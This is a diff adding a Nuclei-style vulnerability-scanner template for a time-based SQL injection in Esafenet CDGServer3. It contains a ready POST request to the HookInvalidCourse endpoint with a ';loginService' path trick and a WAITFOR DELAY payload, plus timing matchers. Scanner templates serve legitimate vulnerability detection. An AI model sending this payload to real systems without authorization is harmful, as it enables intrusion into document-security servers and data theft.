@@ -1,0 +1,36 @@
+id: esafenet-cdgserver3-HookInvalidCourse-sqli
+info:
+  name: 亿赛通-电子文档安全管理系统-HookInvalidCourse-SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E4%BA%BF%E8%B5%9B%E9%80%9A-HookInvalidCourse-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: esafenet,sqli,time,sqli
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /CDGServer3/system/HookInvalidCourse;loginService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=DelHookInvalidCourse&id=1';WAITFOR DELAY '0:0:5'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 404
+          - contains_all(header,'CDGServer3')
+          - duration >= 5 && duration < 9
+        condition: and
